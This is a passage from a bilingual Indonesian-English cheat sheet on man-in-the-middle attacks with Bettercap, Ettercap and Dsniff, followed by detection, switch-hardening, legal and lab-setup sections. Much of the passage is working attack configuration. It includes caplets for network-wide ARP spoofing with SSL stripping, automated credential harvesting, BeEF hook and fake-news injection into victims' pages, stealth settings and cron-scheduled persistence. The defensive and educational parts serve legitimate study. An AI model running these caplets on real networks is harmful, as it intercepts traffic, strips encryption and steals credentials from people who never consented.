» dns.spoof on
» set dns.spoof.domains facebook.com
» set dns.spoof.address 192.168.1.50

# Start attack
» arp.spoof on

# Monitor
» events.stream on
```

---

#### **2. Mass MITM (Entire Network)**
```bash
# Caplet: mass_mitm.cap
net.probe on
sleep 10

set arp.spoof.targets *
set arp.spoof.fullduplex true
arp.spoof on

net.sniff on
set net.sniff.verbose false
set net.sniff.output /tmp/mass_capture.pcap

http.proxy on
set http.proxy.sslstrip true

events.stream on
```

---

#### **3. Automated Credential Harvesting**
```bash
# Caplet: auto_creds.cap
# Discovery
net.probe on
sleep 10

# Target all
set arp.spoof.targets *
set arp.spoof.fullduplex true
arp.spoof on

# Sniff with filters
net.sniff on
set net.sniff.verbose true
set net.sniff.regexp '.*password.*|.*user.*|.*login.*'
set net.sniff.output /tmp/creds.pcap

# Proxy
http.proxy on
set http.proxy.sslstrip true

# Log
set log.file /tmp/creds.log
log on
```

---

#### **4. BeEF Integration**
```bash
# Inject BeEF hook
# Create hook.js
echo "alert('Loading...');" > /tmp/hook.js

# Caplet: beef.cap
http.proxy on
set http.proxy.script /tmp/hook.js

set arp.spoof.targets 192.168.1.100
arp.spoof on

net.sniff on
```

---

### Packet Manipulation

#### **Custom Proxy Scripts**

**Example: Replace Images**
```javascript
// replace_images.js
function onResponse(req, res) {
    if (res.ContentType.indexOf('image') != -1) {
        res.Body = '...'; // Your fake image data
        res.Updated();
    }
}
```

**Example: Inject Fake News**
```javascript
// fake_news.js
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') != -1) {
        var body = res.ReadBody();
        body = body.replace(
            '</body>',
            '<h1 style="color:red;">BREAKING: This is fake news!</h1></body>'
        );
        res.Body = body;
        res.Updated();
    }
}
```

---

### Tips & Best Practices

#### **1. Performance Optimization**
```bash
# Reduce probing throttle
» set net.probe.throttle 10

# Disable verbose if not needed
» set net.sniff.verbose false

# Target specific hosts instead of *
» set arp.spoof.targets 192.168.1.100,192.168.1.101
```

#### **2. Stealth Mode**
```bash
# Disable promiscuous mode detection
» set net.sniff.local false

# Use specific filters
» set net.sniff.filter "tcp port 80"

# Minimal logging
» set log.level WARNING
```

#### **3. Persistence**
```bash
# Save caplet for reuse
» !echo "arp.spoof on" > /tmp/my_attack.cap

# Schedule with cron
# crontab -e
# 0 2 * * * /usr/bin/bettercap -caplet /tmp/my_attack.cap
```

---

### Common Issues & Solutions

#### **"Permission denied"**
```bash
# Run with sudo
sudo bettercap

# Or set capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/bettercap
```

#### **"No such module"**
```bash
# Update bettercap
sudo bettercap -eval "caplets.update"

# Check available modules
» help modules
```

#### **"ARP spoofing not working"**
```bash
# Check IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Should be 1

# Enable manually
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Or in bettercap
» set arp.spoof.internal true
```

#### **"HTTPS proxy certificate error"**
```bash
# Generate certificate
# Bettercap auto-generates, or:
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout bettercap.key -out bettercap.crt

# Set in bettercap
» set https.proxy.certificate bettercap.crt
» set https.proxy.key bettercap.key
```

---

## 🔄 Perbandingan Tools

| Fitur | Ettercap | Dsniff | Bettercap |
|-------|----------|--------|-----------|
| **Active Development** | ❌ Slow | ❌ Discontinued | ✅ Active |
| **GUI** | ✅ GTK | ❌ | ✅ Web UI |
| **Ease of Use** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| **ARP Spoofing** | ✅ | ✅ | ✅ |
| **DNS Spoofing** | ✅ Plugin | ✅ | ✅ |
| **Packet Filtering** | ✅ | ❌ | ✅ |
| **SSL Stripping** | ⚠️ Manual | ✅ webmitm | ✅ Built-in |
| **WiFi Attacks** | ❌ | ❌ | ✅ |
| **Bluetooth** | ❌ | ❌ | ✅ BLE |
| **API/Automation** | ❌ | ❌ | ✅ REST API |
| **Scripting** | ⚠️ Filters | ❌ | ✅ Caplets |
| **Credential Sniffing** | ✅ | ✅ | ✅ |
| **HTTP/HTTPS Proxy** | ⚠️ Manual | ✅ webmitm | ✅ Built-in |
| **Real-time Monitoring** | ⚠️ Limited | ❌ | ✅ Excellent |
| **Platform** | Linux/macOS/Win | Linux/macOS | Linux/macOS/Win |
| **Documentation** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Community** | ⭐⭐⭐ | ⭐ | ⭐⭐⭐⭐⭐ |

### Kapan Menggunakan?

#### **Ettercap**
✅ Jika butuh GUI sederhana
✅ Legacy networks
✅ Simple ARP spoofing
✅ Packet filtering/modification
❌ Modern protocols
❌ Automation

#### **Dsniff**
✅ Quick & dirty credential sniffing
✅ Simple ARP spoofing dengan arpspoof
✅ Classic protocols (FTP, Telnet, POP3)
✅ Lightweight
❌ HTTPS/modern protocols
❌ No longer maintained
❌ Limited features

#### **Bettercap** (⭐ Recommended)
✅ Modern MITM attacks
✅ Automation & scripting
✅ Web UI & API
✅ Multiple protocols
✅ Active development
✅ WiFi & BLE attacks
✅ Comprehensive features
✅ Best for pentesting
⚠️ Steeper learning curve

---

## 🛡️ Defense & Mitigation

### Mendeteksi MITM Attacks

#### **1. ARP Spoofing Detection**

**Menggunakan arpwatch:**
```bash
# Install
sudo apt install arpwatch

# Monitor
sudo arpwatch -i eth0

# Check logs
sudo cat /var/log/arpwatch.log
```

**Manual Detection:**
```bash
# Check ARP table untuk duplicate IPs
arp -a

# Monitor ARP traffic
sudo tcpdump -i eth0 arp

# Look for gratuitous ARP
sudo tcpdump -i eth0 'arp and arp[6:2] == 2'
```

**Menggunakan XArp (Windows/Linux):**
- Real-time ARP monitoring
- Alert pada ARP spoofing
- GUI-based

---

#### **2. Static ARP Entries**

```bash
# Add static ARP entry (Linux)
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# Permanent (add to /etc/network/interfaces)
post-up arp -s 192.168.1.1 00:11:22:33:44:55

# Windows
arp -s 192.168.1.1 00-11-22-33-44-55

# Verify
arp -a
```

---

#### **3. Network Monitoring**

**Snort IDS:**
```bash
# Install
sudo apt install snort

# Configure untuk detect ARP spoofing
# Edit /etc/snort/rules/local.rules
alert arp any any -> any any (msg:"ARP Spoof Detected"; \
  reference:arachnids,27; classtype:attempted-recon; \
  sid:1000001; rev:1;)

# Run
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

---

### Perlindungan

#### **1. Network Segmentation**
- Separate VLANs
- Isolate critical systems
- Limit broadcast domains

#### **2. Switch Security**

**Port Security:**
```bash
# Cisco switch
interface FastEthernet0/1
 switchport mode access
 switchport port-security
 switchport port-security maximum 1
 switchport port-security mac-address sticky
 switchport port-security violation shutdown
```

**Dynamic ARP Inspection (DAI):**
```bash
# Cisco
ip arp inspection vlan 1-100
interface GigabitEthernet0/1
 ip arp inspection trust
```

**DHCP Snooping:**
```bash
# Cisco
ip dhcp snooping
ip dhcp snooping vlan 1-100
interface GigabitEthernet0/1
 ip dhcp snooping trust
```

---

#### **3. Encryption**

**Always use encryption:**
- ✅ HTTPS (SSL/TLS) - Not HTTP
- ✅ SSH - Not Telnet
- ✅ SFTP - Not FTP
- ✅ IMAPS/POP3S - Not IMAP/POP3
- ✅ VPN for all traffic
- ✅ Certificate pinning di aplikasi

---

#### **4. VPN**

```bash
# OpenVPN
sudo apt install openvpn

# Connect
sudo openvpn --config client.ovpn

# All traffic melalui VPN = protected from MITM
```

---

#### **5. Application-Level Protection**

**HSTS (HTTP Strict Transport Security):**
- Force HTTPS
- Prevent SSL stripping

**Certificate Pinning:**
- Hardcode expected certificates
- Prevent fake certificates

**DNSSEC:**
- Signed DNS responses
- Prevent DNS spoofing

---

#### **6. Endpoint Security**

```bash
# Linux - install arpwatch
sudo apt install arpwatch
sudo systemctl enable arpwatch
sudo systemctl start arpwatch

# Install fail2ban
sudo apt install fail2ban

# Monitor logs
sudo tail -f /var/log/auth.log
```

---

### Best Practices

1. ✅ **Always use HTTPS** - especially untuk login/sensitive data
2. ✅ **Verify SSL certificates** - check untuk certificate warnings
3. ✅ **Use VPN** di public WiFi
4. ✅ **Enable firewall** - block unnecessary ports
5. ✅ **Update systems regularly** - patch vulnerabilities
6. ✅ **Use strong authentication** - 2FA/MFA
7. ✅ **Monitor network** - detect anomalies
8. ✅ **Educate users** - awareness training
9. ✅ **Implement IDS/IPS** - intrusion detection
10. ✅ **Static ARP entries** untuk critical systems

---

## ⚠️ Legal & Ethical Considerations

### 🚨 PENTING - WAJIB DIBACA

#### **Legal Boundaries:**

1. ✅ **LEGAL:**
   - Testing di network ANDA SENDIRI
   - Penetration testing dengan **written authorization**
   - Educational purposes di **lab environment**
   - Bug bounty programs dengan **proper scope**

2. ❌ **ILLEGAL:**
   - MITM attack di network orang lain **TANPA IZIN**
   - Intercept komunikasi tanpa consent
   - Steal credentials/data
   - Modify data tanpa authorization
   - DoS/disrupt services

#### **Consequences:**

**Criminal charges:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- UU ITE Pasal 30, 32, 46 - Indonesia
- Hukuman: **penjara + denda**

#### **Ethical Guidelines:**

1. ✅ **Get written permission** sebelum testing
2. ✅ **Define scope** clearly
3. ✅ **Protect data** yang di-intercept
4. ✅ **Report vulnerabilities** responsibly
5. ✅ **Follow disclosure policies**
6. ❌ **Never** use untuk personal gain
7. ❌ **Never** harm/disrupt systems
8. ❌ **Never** steal/leak data

---

## 🎓 Hands-On Lab Setup

### Lab Environment

**Recommended Setup:**

```
┌─────────────────┐
│   Attacker VM   │
│   Kali Linux    │
│  192.168.1.50   │
└────────┬────────┘
         │
    ┌────┴─────┐
    │  Switch  │
    └────┬─────┘
         │
    ┌────┴──────────┬──────────────┐
    │               │              │
┌───┴────┐     ┌────┴───┐    ┌────┴────┐
│Victim VM│    │Router  │    │Web Server│
│Windows  │    │Gateway │    │  Linux  │
│.100     │    │  .1    │    │  .200   │
└─────────┘    └────────┘    └─────────┘
```

**Requirements:**
- VirtualBox/VMware
- Kali Linux (Attacker)
- Windows/Ubuntu (Victim)
- Vulnerable web app (DVWA/WebGoat)

**Network Setup:**
- NAT Network atau Host-Only Network
- Same subnet untuk semua VMs
- Disable promiscuous mode warning

---

### Practice Exercises

#### **Exercise 1: Basic ARP Spoofing**

**Goal:** Intercept traffic antara victim dan gateway

**Tools:** Bettercap

**Steps:**
1. Identify network dengan `net.probe`
2. Set target victim
3. Enable ARP spoofing
4. Capture credentials

---

#### **Exercise 2: DNS Spoofing**

**Goal:** Redirect victim ke fake website

**Tools:** Bettercap, Apache

**Steps:**
1. Setup fake web server
2. Configure DNS spoofing
3. Redirect specific domains
4. Capture credentials dari fake site

---

#### **Exercise 3: SSL Stripping**

**Goal:** Downgrade HTTPS ke HTTP

**Tools:** Bettercap dengan http.proxy

**Steps:**
1. Enable HTTP proxy
2. Enable SSL stripping
3. Intercept HTTPS traffic
4. Observe plaintext credentials

---

## 📚 Resources

### Official Documentation
- **Ettercap:** https://www.ettercap-project.org/
- **Dsniff:** https://www.monkey.org/~dugsong/dsniff/
- **Bettercap:** https://www.bettercap.org/

### Learning Resources
- **Bettercap Caplets:** https://github.com/bettercap/caplets
- **Pentesting Labs:** https://www.hackthebox.eu/
- **OWASP:** https://owasp.org/

### Books
- "The Web Application Hacker's Handbook"
- "Network Security Assessment"
- "Metasploit: The Penetration Tester's Guide"

---

## 🏆 Summary

### Quick Reference

**Ettercap:**
```bash
sudo ettercap -T -i eth0 -M arp:remote /victim/ /gateway/
```

**Dsniff:**
```bash
# Terminal 1
sudo arpspoof -i eth0 -t victim gateway

# Terminal 2
sudo dsniff -i eth0
```

**Bettercap:**
```bash
sudo bettercap
» set arp.spoof.targets victim
» arp.spoof on
» net.sniff on
```

---

**Happy Hacking! 🎭 (Responsibly & Legally)**

---

*Cheat sheet ini dibuat untuk tujuan **EDUKASI** saja.*
*Gunakan dengan **BERTANGGUNG JAWAB** dan **LEGAL**.*
*Author tidak bertanggung jawab atas penyalahgunaan.*

**Version:** 1.0  
**Last Updated:** January 12, 2026  
**Author:** TangselSecTeam - Batch 1
